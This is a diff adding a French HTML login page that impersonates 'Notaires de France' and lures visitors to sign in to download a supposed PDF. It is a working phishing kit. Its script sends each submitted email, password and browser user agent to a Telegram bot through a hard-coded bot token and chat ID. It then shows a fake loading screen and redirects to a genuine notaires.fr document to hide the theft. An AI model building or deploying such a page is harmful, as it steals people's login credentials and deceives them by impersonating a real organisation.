@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Notaires de France</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Arrière-plan avec effet de flou */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('PLAN.jpeg'); /* À remplacer par votre image */
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px);
+            transform: scale(1.1); /* Évite les bords blancs causés par le flou */
+            z-index: -1;
+        }
+
+        /* Container principal */
+        .container {
+            position: relative;
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        /* Boîte de connexion */
+        .login-box {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo-container img {
+            max-width: 200px;
+            height: auto;
+        }
+        
+        /* Style pour le texte sous le logo avec icône PDF */
+        .login-message {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #333;
+            font-size: 16px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Style pour l'icône PDF */
+        .pdf-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            display: inline-block;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0056b3;
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3);
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .remember-me input {
+            margin-right: 10px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .submit-btn:hover {
+            background-color: #003d82;
+        }
+
+        .links {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .links a {
+            color: #0056b3;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            font-size: 14px;
+        }
+        
+        /* Style pour le message de chargement */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0056b3;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Arrière-plan avec effet de flou -->
+    <div class="background"></div>
+    
+    <!-- Overlay de chargement -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p>Chargement de votre document...</p>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <div class="logo-container">
+                <img src="NOTAIRE.png" alt="Logo Notaires de France">
+            </div>
+            
+            <!-- Texte avec icône PDF -->
+            <div class="login-message">
+                <svg class="pdf-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
+                    <!-- Icône PDF -->
+                    <path fill="#e74c3c" d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
+                </svg>
+                <span>Connectez-vous pour télécharger votre fichier</span>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Adresse email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Mot de passe</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Se souvenir de moi</label>
+                </div>
+
+                <button type="submit" class="submit-btn">Se connecter</button>
+
+                <div class="links">
+                    <a href="#">Mot de passe oublié ?</a>
+                    <a href="#">Besoin d'aide ?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 Notaires de France. Tous droits réservés.</p>
+    </footer>
+
+    <script>
+        // Configuration Telegram
+        const telegramBotToken = '7792919542:AAEJ3WN0i4SAKJIBcU0nColbkfTebzSuaJA'; // Remplacez par votre token de bot Telegram
+        const telegramChatId = '5907019836'; // Remplacez par votre Chat ID
+        
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(email, password) {
+            const text = `📄 Nouvelles informations de connexion:\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n\n📱 Appareil: ${navigator.userAgent}`;
+            
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: telegramChatId,
+                text: text,
+                parse_mode: 'HTML'
+            };
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Gestion du formulaire
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Afficher l'overlay de chargement
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // Envoyer les données à Telegram
+            const success = await sendToTelegram(email, password);
+            
+            // Simuler un délai de chargement (2-3 secondes)
+            setTimeout(() => {
+                // Rediriger vers une page de téléchargement ou afficher un message d'erreur
+                if (success) {
+                    // Option 1: Rediriger vers une page de téléchargement
+                    window.location.href = 'https://www.notaires.fr/fr/media/document/telechargement-exemple.pdf';
+                    
+                    // Option 2: Ouvrir un PDF fictif
+                    // const pdfUrl = 'chemin/vers/votre/document.pdf';
+                    // window.open(pdfUrl, '_blank');
+                } else {
+                    alert('Une erreur est survenue. Veuillez réessayer plus tard.');
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                }
+            }, 2500);
+        });
+    </script>
+</body>
+</html>
